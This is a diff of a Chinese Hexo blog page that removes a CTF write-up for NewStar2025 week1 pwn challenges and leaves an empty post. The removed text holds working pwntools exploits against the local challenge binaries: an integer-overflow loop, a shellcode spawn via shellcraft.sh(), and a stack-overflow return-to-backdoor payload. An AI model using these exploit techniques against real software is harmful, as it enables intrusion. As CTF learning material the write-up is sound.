@@ -20,27 +20,30 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"yourdomain.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="西电ctf Newstar2025 week1 pwn题。">
+    <meta name="description" content="个人博客，记录技术、生活和思考">
 <meta property="og:type" content="article">
-<meta property="og:title" content="week1pwn题">
-<meta property="og:url" content="https://yourdomain.com/2026/04/20/week1/index.html">
+<meta property="og:title" content="林夏的博客">
+<meta property="og:url" content="https://yourdomain.com/2026/04/21/resyscall/index.html">
 <meta property="og:site_name" content="林夏的博客">
-<meta property="og:description" content="西电ctf Newstar2025 week1 pwn题。">
+<meta property="og:description" content="个人博客，记录技术、生活和思考">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-04-20T12:33:00.000Z">
-<meta property="article:modified_time" content="2026-04-21T09:45:22.760Z">
+<meta property="article:published_time" content="2026-04-21T09:48:04.702Z">
+<meta property="article:modified_time" content="2026-04-21T09:48:04.702Z">
 <meta property="article:author" content="林夏">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Hexo">
+<meta property="article:tag" content="分享">
+<meta property="article:tag" content="博客">
+<meta property="article:tag" content="技术">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://yourdomain.com/2026/04/20/week1/">
+<link rel="canonical" href="https://yourdomain.com/2026/04/21/resyscall/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://yourdomain.com/2026/04/20/week1/","path":"2026/04/20/week1/","title":"week1pwn题"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://yourdomain.com/2026/04/21/resyscall/","path":"2026/04/21/resyscall/","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week1pwn题 | 林夏的博客</title>
+<title> | 林夏的博客</title>
   
 
 
@@ -110,7 +113,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -123,7 +126,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-gun-debugger"><span class="nav-number">1.</span> <span class="nav-text">一. gun-debugger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-intbug"><span class="nav-number">2.</span> <span class="nav-text">二.intbug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-pwn-door"><span class="nav-number">3.</span> <span class="nav-text">三.pwn door</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-import-function"><span class="nav-number">4.</span> <span class="nav-text">四. import_function</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-overflow"><span class="nav-number">5.</span> <span class="nav-text">五.overflow</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -172,7 +174,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/20/week1/">
+    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/21/resyscall/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -185,12 +187,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week1pwn题 | 林夏的博客">
+      <meta itemprop="name" content=" | 林夏的博客">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          week1pwn题
+          
         </h1>
 
         <div class="post-meta-container">
@@ -201,23 +203,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2026-04-20 20:33:00" itemprop="dateCreated datePublished" datetime="2026-04-20T20:33:00+08:00">2026-04-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-21 17:45:22" itemprop="dateModified" datetime="2026-04-21T17:45:22+08:00">2026-04-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
-        </span>
+      <time title="创建时间：2026-04-21 17:48:04" itemprop="dateCreated datePublished" datetime="2026-04-21T17:48:04+08:00">2026-04-21</time>
     </span>
 
   
@@ -229,55 +215,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>西电ctf Newstar2025 week1 pwn题。</p>
-<span id="more"></span>
-<h2 id="一-gun-debugger"><a href="#一-gun-debugger" class="headerlink" title="一. gun-debugger"></a>一. gun-debugger</h2><p>根据文件自带的说明并使用WebSocketReflectorX后，在虚拟机中运行程序。</p>
-<ol>
-<li><strong>第一步找到r12中的值</strong>:我忘记了哈哈</li>
-<li><strong>第二步运用x&#x2F;s 这个指令找出那个地址里存的信息</strong>:GDB_IS_POWERFUL,这个我记得。</li>
-<li>**第三步给那个地址下断点，再运行就可 **:就是要重新前俩步。</li>
-<li><strong>最后就是运用set {int}0x7fffffffdbf4 &#x3D; 0xdeadbeef这个命令按要求替换</strong>:记得连上远端按照开局run ip 端口进入程序，然后就可拿到flag。</li>
-</ol>
-<h2 id="二-intbug"><a href="#二-intbug" class="headerlink" title="二.intbug"></a>二.intbug</h2><p>这个先用指令检查保护等信息，然后拖入ida中。</p>
-<ol>
-<li><strong>进行反编译然后进入func函数中</strong> : 然后进行分析，发现其核心功能是输入数字校验并触发flag读取。</li>
-<li><strong>__int16</strong>:__int16  是16位有符号整数，它在内存里用 16个二进制位 来存储数据，其中：</li>
-</ol>
-<ul>
-<li>最高位（第16位）是符号位： 0  表示正数， 1  表示负数。<br>​</li>
-<li>剩下的15位用来存数值的绝对值。</li>
-</ul>
-<p>所以它的取值范围是：</p>
-<ul>
-<li>最大正数： 0111 1111 1111 1111 （二进制） → 对应十进制 32767<br>​</li>
-<li>最小负数： 1000 0000 0000 0000 （二进制） → 对应十进制 -32768。</li>
-</ul>
-<ol start="3">
-<li><strong>当32767加1会进行补码</strong>:根据补码原则，这个二进制数代表的十进制值是 -32768。</li>
-<li><strong>然后构建脚本</strong>:<br>from pwn import *</li>
-</ol>
-<p>#r &#x3D; process(“.&#x2F;ig”)<br>r&#x3D;remote(“127.0.0.1”,44519)<br>r.recvuntil(b”welcome to NewStarCTF2025!\n\n”)</p>
-<p>payload &#x3D; b”1”</p>
-<p>for i in range(32767):<br>    r.sendline(payload)<br>r.interactive()<br>5. <strong>拿到flag</strong></p>
-<h2 id="三-pwn-door"><a href="#三-pwn-door" class="headerlink" title="三.pwn door"></a>三.pwn door</h2><p>打开ida，发现只要输入v4的值即可得到flag,所以连上远端，输入7038329即可得到flag</p>
-<h2 id="四-import-function"><a href="#四-import-function" class="headerlink" title="四. import_function"></a>四. import_function</h2><p>mmp,申请了内存可读，可写，可执行，且buf指向可执行的内存区，程序还把buf直接当作函数调用，所以用shellcode</p>
-<ol>
-<li><strong>脚本</strong> :<br>from pwn import *</li>
-</ol>
-<p>context(arch&#x3D;’amd64’, os&#x3D;’linux’)</p>
-<p>#p &#x3D; process(‘.&#x2F;if’)<br>p &#x3D; remote(“127.0.0.1”, 37521)</p>
-<p>payload &#x3D; asm(shellcraft.sh())</p>
-<p>p.send(payload)</p>
-<p>p.interactive()</p>
-<h2 id="五-overflow"><a href="#五-overflow" class="headerlink" title="五.overflow"></a>五.overflow</h2><p>检查保护并打开ida ,发现gets存在存在栈溢出</p>
-<p>发现后门函数backd00r，地址0x401200<br>随后注意栈对齐，编写脚本</p>
-<ol>
-<li><strong>脚本</strong><br>from pwn import *</li>
-</ol>
-<p>#p &#x3D; process(‘.&#x2F;overflow’)<br>p &#x3D; remote(“127.0.0.1”, 33123)<br>padding &#x3D; 0x100+8<br>ret &#x3D; 0x401016<br>backdoor &#x3D; 0x401200<br>payload &#x3D; b’a’ * padding + p64(ret) + p64(backdoor)</p>
-<p>p.sendlineafter(b’Enter your input:\n’, payload)</p>
-<p>p.interactive()</p>
-
+    <div class="post-body" itemprop="articleBody">
     </div>
 
     
@@ -285,22 +223,16 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2026/04/20/111/" rel="prev" title="常见保护机制">
-                  <i class="fa fa-angle-left"></i> 常见保护机制
+                <a href="/2026/04/21/%E6%88%91%E7%9A%84%E6%8C%87%E4%BB%A4/" rel="prev" title="我的指令">
+                  <i class="fa fa-angle-left"></i> 我的指令
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2026/04/21/%E6%88%91%E7%9A%84%E6%8C%87%E4%BB%A4/" rel="next" title="我的指令">
-                  我的指令 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
